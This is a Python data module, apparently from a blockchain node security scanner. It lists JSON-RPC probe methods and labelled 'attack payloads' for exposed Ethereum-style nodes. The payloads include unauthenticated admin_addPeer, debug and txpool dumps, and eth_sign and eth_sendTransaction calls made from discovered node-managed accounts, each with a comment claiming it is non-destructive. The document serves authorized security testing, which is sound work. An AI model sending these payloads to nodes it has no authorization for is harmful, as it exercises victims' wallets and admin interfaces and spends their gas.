"""
JSON-RPC method probe lists and attack payloads for blockchain node security testing.

Passive scanner probes (read-only, safe to run against any endpoint):
    NODE_INFO_METHODS, PEER_EXPOSURE_METHODS, WALLET_ENUM_METHODS,
    MINING_STATUS_METHODS, DEBUG_PROBE_METHODS

Active attacker payloads (require --i-have-authorization):
    ADMIN_ABUSE_PAYLOADS, DEBUG_LEAK_PAYLOADS, UNRESTRICTED_SIGNING_PAYLOADS

IMPORTANT: All attacker payloads are engineered to be non-destructive — no
payload adds a real peer, starts real mining, or moves funds to a third
party. See each payload's `safety_note`.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Passive node-info enumeration: (method, params)
# ---------------------------------------------------------------------------
NODE_INFO_METHODS: list[tuple[str, list]] = [
    ("web3_clientVersion", []),
    ("net_version", []),
    ("eth_chainId", []),
    ("eth_blockNumber", []),
    ("eth_syncing", []),
    ("net_peerCount", []),
]

PEER_EXPOSURE_METHODS: list[tuple[str, list]] = [
    ("admin_nodeInfo", []),
    ("admin_peers", []),
    ("admin_datadir", []),
]

WALLET_ENUM_METHODS: list[tuple[str, list]] = [
    ("eth_accounts", []),
    ("personal_listAccounts", []),
    ("personal_listWallets", []),
]

MINING_STATUS_METHODS: list[tuple[str, list]] = [
    ("eth_mining", []),
    ("eth_coinbase", []),
    ("eth_hashrate", []),
    ("miner_getHashrate", []),
]

# Debug/txpool methods are probed with a syntactically valid but harmless
# argument. A JSON-RPC error (method not found) means the namespace is
# disabled; any other response (including a parameter/validation error)
# proves the namespace is enabled and reachable without authentication.
DEBUG_PROBE_METHODS: list[tuple[str, list]] = [
    ("debug_traceTransaction", ["0x" + "0" * 64, {}]),
    ("debug_dumpBlock", ["latest"]),
    ("txpool_status", []),
    ("txpool_content", []),
]


# ---------------------------------------------------------------------------
# Active attack payloads (BlockchainAttacker, --i-have-authorization required)
# ---------------------------------------------------------------------------

# Admin-namespace abuse: only read-only admin methods return real data.
# admin_addPeer is called with a non-routable loopback enode so a successful
# call proves the namespace is exploitable without adding a functioning peer.
ADMIN_ABUSE_PAYLOADS: list[dict] = [
    {
        "id": "CHAIN-ATK-ADMIN-001",
        "method": "admin_peers",
        "params": [],
        "severity": "critical",
        "description": "Unauthenticated admin_peers call discloses connected peer list",
        "safety_note": "Read-only; does not modify the peer table.",
    },
    {
        "id": "CHAIN-ATK-ADMIN-002",
        "method": "admin_nodeInfo",
        "params": [],
        "severity": "high",
        "description": "Unauthenticated admin_nodeInfo discloses node ID, enode URL, and listen ports",
        "safety_note": "Read-only; does not modify node configuration.",
    },
    {
        "id": "CHAIN-ATK-ADMIN-003",
        "method": "admin_addPeer",
        "params": ["enode://" + "0" * 128 + "@127.0.0.1:0"],
        "severity": "critical",
        "description": "admin_addPeer accepted a call from an unauthenticated client",
        "safety_note": "Uses a non-routable loopback enode; no functional peer is added.",
    },
]

DEBUG_LEAK_PAYLOADS: list[dict] = [
    {
        "id": "CHAIN-ATK-DEBUG-001",
        "method": "debug_dumpBlock",
        "params": ["latest"],
        "severity": "high",
        "description": "debug_dumpBlock discloses full state of the latest block without authentication",
        "safety_note": "Read-only.",
    },
    {
        "id": "CHAIN-ATK-DEBUG-002",
        "method": "txpool_content",
        "params": [],
        "severity": "medium",
        "description": "txpool_content discloses pending transaction pool contents without authentication",
        "safety_note": "Read-only.",
    },
]

# {account} is substituted with an address discovered via eth_accounts /
# personal_listAccounts before these payloads are sent.
UNRESTRICTED_SIGNING_PAYLOADS: list[dict] = [
    {
        "id": "CHAIN-ATK-SIGN-001",
        "method": "eth_sign",
        "params_template": ["{account}", "0x70726f6265"],  # hex("probe")
        "severity": "critical",
        "description": "eth_sign executed on a node-managed account without authentication",
        "safety_note": "Signs a fixed benign message; does not transfer funds.",
    },
    {
        "id": "CHAIN-ATK-SIGN-002",
        "method": "eth_sendTransaction",
        "params_template": [{"from": "{account}", "to": "{account}", "value": "0x0"}],
        "severity": "critical",
        "description": "eth_sendTransaction executed on a node-managed account without authentication",
        "safety_note": (
            "Zero-value self-transfer only — no funds leave the account. "
            "Gas is the sole cost, paid by the node owner's own account."
        ),
    },
]
